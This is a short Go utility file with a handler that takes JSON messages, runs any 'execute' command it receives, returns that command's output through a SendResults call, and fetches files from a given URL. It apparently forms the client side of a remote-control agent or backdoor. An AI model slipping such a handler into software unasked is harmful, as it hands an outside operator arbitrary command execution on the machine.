package utils

import (
	"os/exec"
)

func HandleCommand(cmd_json map[string]interface{}) {
	cmd_type, ok := cmd_json["type"].(string)
	if !ok {
		return
	}

	if cmd_type == "execute" {

		cmd, ok := cmd_json["command"].(string)
		if !ok {
			return
		}

		handleExecute(cmd)

	} else if cmd_type == "download" {
		url, ok := cmd_json["url"].(string)
		if !ok {
			return
		}

		handleDownload(url)
	}

}

func handleDownload(url string) {
	DownloadFrom(url)
}

func handleExecute(cmd string) {
	command := exec.Command(cmd)

	output, err := command.Output()
	if err != nil {
		return
	}

	results := append([]byte(cmd+"\n"), output...)
	SendResults(results)
}
